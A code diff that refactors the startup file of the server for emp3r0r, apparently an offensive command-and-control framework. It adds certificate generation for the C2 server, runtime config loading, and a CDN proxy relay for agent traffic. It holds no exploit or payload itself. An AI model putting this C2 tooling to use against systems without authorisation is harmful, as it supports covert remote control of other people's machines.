@@ -4,9 +4,7 @@
 package main
 
 import (
-	"encoding/json"
 	"flag"
-	"fmt"
 	"io/ioutil"
 	"log"
 	"os"
@@ -18,49 +16,20 @@ import (
 	cdn2proxy "github.com/jm33-m0/go-cdn2proxy"
 )
 
-// Config change cc's configuration at runtime
-type Config struct {
-	Version       string `json:"version"`
-	SSHDPort      string `json:"sshd_port"`
-	BroadcastPort string `json:"broadcast_port"`
-	ProxyPort     string `json:"proxy_port"`
-	CCPort        string `json:"cc_port"`
-	CCIP          string `json:"ccip"`
-	CA            string `json:"ca"`
-}
-
 func readJSONConfig(filename string) (err error) {
 	// read JSON
 	jsonData, err := ioutil.ReadFile(filename)
 	if err != nil {
-		log.Fatal(err)
+		return
 	}
 
-	// parse the json
-	var config Config
-	err = json.Unmarshal(jsonData, &config)
-	if err != nil {
-		return fmt.Errorf("failed to parse JSON config: %v", err)
-	}
-
-	// set up runtime vars
-	emp3r0r_data.Version = config.Version
-	emp3r0r_data.SSHDPort = config.SSHDPort
-	emp3r0r_data.BroadcastPort = config.BroadcastPort
-	emp3r0r_data.ProxyPort = config.ProxyPort
-	emp3r0r_data.CCPort = config.CCPort
-	emp3r0r_data.CCAddress = fmt.Sprintf("https://%s", config.CCIP)
-
-	// CA
-	tun.CACrt = []byte(config.CA)
-
-	return
+	return emp3r0r_data.ReadJSONConfig(jsonData, cc.RuntimeConfig)
 }
 
 // cleanup temp files
 func cleanup() bool {
 	// is cc currently running?
-	if tun.IsPortOpen("127.0.0.1", emp3r0r_data.CCPort) {
+	if tun.IsPortOpen("127.0.0.1", cc.RuntimeConfig.CCPort) {
 		return false
 	}
 
@@ -82,7 +51,6 @@ func cleanup() bool {
 }
 
 func main() {
-	go cc.TLSServer()
 
 	// cleanup or abort
 	if !cleanup() {
@@ -90,14 +58,30 @@ func main() {
 	}
 
 	cdnproxy := flag.String("cdn2proxy", "", "Start cdn2proxy server on this port")
-	config := flag.String("config", "build.json", "Use this config file to update hardcoded variables")
+	config := flag.String("config", cc.EmpConfigFile, "Use this config file to update hardcoded variables")
+	names := flag.String("gencert", "", "Generate C2 server cert with these host names")
 	apiserver := flag.Bool("api", false, "Run API server in background, you can send commands to /tmp/emp3r0r.socket")
 	flag.Parse()
+
+	if *names != "" {
+		hosts := strings.Fields(*names)
+		err := cc.GenC2Certs(hosts)
+		if err != nil {
+			log.Fatalf("GenC2Certs: %v", err)
+		}
+		err = cc.InitConfigFile(hosts[0])
+		if err != nil {
+			log.Fatalf("Init %s: %v", cc.EmpConfigFile, err)
+		}
+	}
 
 	// read config file
 	err := readJSONConfig(*config)
 	if err != nil {
-		log.Printf("Read config: %s", err)
+		log.Fatalf("Read %s: %v", *config, err)
+	} else {
+		go cc.TLSServer()
+		go cc.InitModules()
 	}
 
 	if *cdnproxy != "" {
@@ -106,7 +90,7 @@ func main() {
 			if err != nil {
 				log.Fatal(err)
 			}
-			err = cdn2proxy.StartServer(*cdnproxy, "127.0.0.1:"+emp3r0r_data.CCPort, "ws", logFile)
+			err = cdn2proxy.StartServer(*cdnproxy, "127.0.0.1:"+cc.RuntimeConfig.CCPort, "ws", logFile)
 			if err != nil {
 				log.Fatal(err)
 			}
@@ -122,6 +106,5 @@ func main() {
 	if *apiserver {
 		go cc.APIMain()
 	}
-	go cc.InitModules()
 	cc.CliMain()
 }
